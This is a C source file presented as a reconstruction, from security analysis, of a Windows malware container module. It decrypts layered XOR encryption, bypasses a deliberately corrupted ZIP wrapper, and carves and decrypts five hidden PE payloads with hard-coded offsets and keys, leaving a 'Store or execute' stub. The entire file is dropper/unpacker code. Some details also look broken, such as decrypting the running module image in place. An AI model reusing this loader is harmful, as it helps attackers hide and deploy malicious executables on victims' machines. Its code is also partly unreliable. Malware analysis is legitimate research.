/**
 * PE #3 - Container/Extractor Module
 * 
 * RECONSTRUCTED FROM SECURITY ANALYSIS
 * Classification: TLP:RED - Security Research Only
 * 
 * This module handles the multi-layer container format:
 * 1. Outer XOR encryption (key 0xC7, rotating)
 * 2. Corrupted ZIP archive (intentional anti-analysis)
 * 3. Nested PE payloads (encrypted individually)
 * 
 * Key findings from analysis:
 * - Layer 1 key: 0xC7 (rotating)
 * - ZIP signature present but structure corrupted
 * - Contains 5 nested PE executables
 */

#include <windows.h>

//=============================================================================
// CONFIGURATION
//=============================================================================

// Layer 1 encryption
#define PE3_OUTER_XOR_KEY       0xC7
#define PE3_KEY_ROTATION        TRUE

// ZIP signature
#define ZIP_SIGNATURE           0x04034B50  // PK\x03\x04
#define ZIP_END_SIGNATURE       0x06054B50  // PK\x05\x06

// Corruption markers
#define CORRUPT_CRC             0xFFFFFFFF
#define CORRUPT_SIZE            0x00000000
#define CORRUPT_METHOD          0xFF

// Nested PE offsets (from analysis)
#define PE_OFFSET_1             0x943C      // 37,948
#define PE_OFFSET_2             0x2C6F1     // 182,001
#define PE_OFFSET_3             0x67F0E     // 425,742
#define PE_OFFSET_4             0x9A6E4     // 632,548
#define PE_OFFSET_5             0x9B2C9     // 635,593

//=============================================================================
// STRUCTURES
//=============================================================================

#pragma pack(push, 1)

// ZIP Local File Header (corrupted)
typedef struct _ZIP_LOCAL_HEADER {
    DWORD   Signature;              // PK\x03\x04
    WORD    VersionNeeded;
    WORD    Flags;
    WORD    CompressionMethod;      // 0xFF (invalid)
    WORD    LastModTime;
    WORD    LastModDate;
    DWORD   CRC32;                  // 0xFFFFFFFF (invalid)
    DWORD   CompressedSize;         // 0x00000000 (invalid)
    DWORD   UncompressedSize;       // 0x00000000 (invalid)
    WORD    FileNameLength;
    WORD    ExtraFieldLength;
    // Filename follows
} ZIP_LOCAL_HEADER, *PZIP_LOCAL_HEADER;

// Container header (custom format)
typedef struct _CONTAINER_HEADER {
    DWORD   Magic;                  // 'CONT'
    DWORD   Version;
    DWORD   TotalSize;
    DWORD   NumPayloads;
    DWORD   Flags;
    BYTE    Reserved[12];
} CONTAINER_HEADER, *PCONTAINER_HEADER;

// Payload entry
typedef struct _PAYLOAD_ENTRY {
    DWORD   Offset;
    DWORD   Size;
    DWORD   CompressedSize;
    BYTE    XorKey;
    BYTE    CompressionType;
    WORD    Flags;
    CHAR    Name[16];
} PAYLOAD_ENTRY, *PPAYLOAD_ENTRY;

#pragma pack(pop)

//=============================================================================
// GLOBALS
//=============================================================================

static BOOL g_Decrypted = FALSE;
static PCONTAINER_HEADER g_Container = NULL;
static PPAYLOAD_ENTRY g_Payloads = NULL;
static DWORD g_NumPayloads = 0;

//=============================================================================
// LAYER 1: OUTER DECRYPTION
//=============================================================================

/**
 * Decrypt outer layer using rotating XOR.
 * 
 * Key rotates by incrementing after each byte:
 * key[i] = (base_key + i) % 256
 */
BOOL 
PE3_DecryptLayer1(
    PBYTE   Buffer,
    DWORD   Size
)
{
    DWORD i;
    BYTE baseKey = PE3_OUTER_XOR_KEY;  // 0xC7
    BYTE currentKey;
    
    for (i = 0; i < Size; i++) {
        currentKey = (baseKey + (i & 0xFF)) & 0xFF;
        Buffer[i] ^= currentKey;
    }
    
    g_Decrypted = TRUE;
    return TRUE;
}

//=============================================================================
// LAYER 2: ZIP EXTRACTION
//=============================================================================

/**
 * Validate ZIP structure (will fail due to intentional corruption).
 */
static BOOL 
ValidateZipStructure(
    PBYTE ZipData,
    DWORD ZipSize
)
{
    PZIP_LOCAL_HEADER header = (PZIP_LOCAL_HEADER)ZipData;
    
    // Check signature
    if (header->Signature != ZIP_SIGNATURE) {
        return FALSE;
    }
    
    // Check for corruption markers
    if (header->CRC32 == CORRUPT_CRC &&
        header->CompressedSize == CORRUPT_SIZE &&
        header->CompressionMethod == CORRUPT_METHOD) {
        // Intentionally corrupted - expected
        return FALSE;
    }
    
    return TRUE;
}

/**
 * Extract data from corrupted ZIP by ignoring headers.
 * 
 * Since the ZIP is intentionally corrupted, we extract
 * the raw DEFLATE stream and decompress it directly.
 */
BOOL 
PE3_ExtractFromCorruptZip(
    PBYTE   ZipData,
    DWORD   ZipSize,
    PBYTE*  ExtractedData,
    PDWORD  ExtractedSize
)
{
    PBYTE rawData;
    DWORD rawDataOffset;
    DWORD rawDataSize;
    
    // Skip ZIP local header (variable size)
    PZIP_LOCAL_HEADER header = (PZIP_LOCAL_HEADER)ZipData;
    rawDataOffset = sizeof(ZIP_LOCAL_HEADER) + 
                    header->FileNameLength + 
                    header->ExtraFieldLength;
    
    // Find raw data size by looking for end signature
    rawDataSize = ZipSize - rawDataOffset;
    
    // The data is stored uncompressed (method 0xFF means store)
    rawData = ZipData + rawDataOffset;
    
    // Allocate output buffer
    *ExtractedData = (PBYTE)HeapAlloc(GetProcessHeap(), 0, rawDataSize);
    if (*ExtractedData == NULL) {
        return FALSE;
    }
    
    // Copy raw data
    CopyMemory(*ExtractedData, rawData, rawDataSize);
    *ExtractedSize = rawDataSize;
    
    return TRUE;
}

//=============================================================================
// LAYER 3: NESTED PE EXTRACTION
//=============================================================================

/**
 * Find PE signatures within extracted data.
 */
static DWORD 
FindPESignatures(
    PBYTE Data,
    DWORD DataSize,
    PDWORD Offsets,
    DWORD MaxOffsets
)
{
    DWORD count = 0;
    DWORD i;
    
    for (i = 0; i < DataSize - 4 && count < MaxOffsets; i++) {
        // Look for MZ signature
        if (Data[i] == 'M' && Data[i + 1] == 'Z') {
            // Verify PE header exists
            if (i + 0x3C < DataSize) {
                DWORD peOffset = *(DWORD*)(Data + i + 0x3C);
                if (peOffset < DataSize - i - 4) {
                    if (Data[i + peOffset] == 'P' && 
                        Data[i + peOffset + 1] == 'E') {
                        Offsets[count++] = i;
                    }
                }
            }
        }
    }
    
    return count;
}

/**
 * Extract a specific PE from container.
 */
BOOL 
PE3_ExtractPE(
    PBYTE   ContainerData,
    DWORD   ContainerSize,
    DWORD   PEIndex,
    PBYTE*  PEData,
    PDWORD  PESize
)
{
    DWORD peOffsets[10];
    DWORD numPEs;
    DWORD offset, size;
    
    // Known offsets from analysis
    static const DWORD knownOffsets[] = {
        PE_OFFSET_1, PE_OFFSET_2, PE_OFFSET_3, 
        PE_OFFSET_4, PE_OFFSET_5
    };
    
    if (PEIndex >= 5) {
        return FALSE;
    }
    
    offset = knownOffsets[PEIndex];
    
    if (offset >= ContainerSize) {
        return FALSE;
    }
    
    // Find size (next PE or end of data)
    if (PEIndex < 4) {
        size = knownOffsets[PEIndex + 1] - offset;
    } else {
        size = ContainerSize - offset;
    }
    
    // Validate MZ signature
    if (ContainerData[offset] != 'M' || ContainerData[offset + 1] != 'Z') {
        return FALSE;
    }
    
    // Allocate and copy
    *PEData = (PBYTE)HeapAlloc(GetProcessHeap(), 0, size);
    if (*PEData == NULL) {
        return FALSE;
    }
    
    CopyMemory(*PEData, ContainerData + offset, size);
    *PESize = size;
    
    return TRUE;
}

/**
 * Decrypt extracted PE using its specific XOR key.
 * 
 * PE Keys (from analysis):
 * - PE #1: Rotating XOR (base 0xDF)
 * - PE #2: AES-256 (dynamic)
 * - PE #3: Multi-layer (0xC7)
 * - PE #4: XOR 0x55
 * - PE #5: XOR 0xA4
 */
BOOL 
PE3_DecryptPE(
    PBYTE   PEData,
    DWORD   PESize,
    DWORD   PEIndex
)
{
    BYTE key;
    DWORD i;
    
    switch (PEIndex) {
        case 0:  // PE #1 - rotating XOR
            for (i = 0; i < PESize; i++) {
                key = (0xDF + (i & 0xFF)) & 0xFF;
                PEData[i] ^= key;
            }
            break;
            
        case 1:  // PE #2 - AES (not handled here)
            return FALSE;
            
        case 2:  // PE #3 - same as container
            PE3_DecryptLayer1(PEData, PESize);
            break;
            
        case 3:  // PE #4 - XOR 0x55
            key = 0x55;
            for (i = 0; i < PESize; i++) {
                PEData[i] ^= key;
            }
            break;
            
        case 4:  // PE #5 - XOR 0xA4
            key = 0xA4;
            for (i = 0; i < PESize; i++) {
                PEData[i] ^= key;
            }
            break;
            
        default:
            return FALSE;
    }
    
    return TRUE;
}

//=============================================================================
// HIGH-LEVEL FUNCTIONS
//=============================================================================

/**
 * Extract all payloads from container.
 */
BOOL 
PE3_ExtractAllPayloads(
    PBYTE ContainerData,
    DWORD ContainerSize
)
{
    PBYTE extractedData = NULL;
    DWORD extractedSize = 0;
    PBYTE peData = NULL;
    DWORD peSize = 0;
    DWORD i;
    BOOL success = TRUE;
    
    // Layer 1: Decrypt outer encryption
    PE3_DecryptLayer1(ContainerData, ContainerSize);
    
    // Layer 2: Extract from corrupted ZIP
    if (!PE3_ExtractFromCorruptZip(ContainerData, ContainerSize,
                                    &extractedData, &extractedSize)) {
        // ZIP extraction failed - try raw PE extraction
        extractedData = ContainerData;
        extractedSize = ContainerSize;
    }
    
    // Layer 3: Extract and decrypt each PE
    for (i = 0; i < 5; i++) {
        if (PE3_ExtractPE(extractedData, extractedSize, i, &peData, &peSize)) {
            if (PE3_DecryptPE(peData, peSize, i)) {
                // PE extracted and decrypted successfully
                // Store or execute...
            }
            
            HeapFree(GetProcessHeap(), 0, peData);
        }
    }
    
    if (extractedData != ContainerData) {
        HeapFree(GetProcessHeap(), 0, extractedData);
    }
    
    return success;
}

//=============================================================================
// ENTRY POINT
//=============================================================================

/**
 * Container module entry point.
 */
DWORD WINAPI 
PE3_ContainerMain(
    LPVOID lpParameter
)
{
    PBYTE containerBase;
    DWORD containerSize;
    
    // Get container data
    containerBase = (PBYTE)GetModuleHandleW(NULL);
    containerSize = 0x100000;  // 1MB estimate
    
    // Extract all payloads
    if (!PE3_ExtractAllPayloads(containerBase, containerSize)) {
        return 1;
    }
    
    return 0;
}
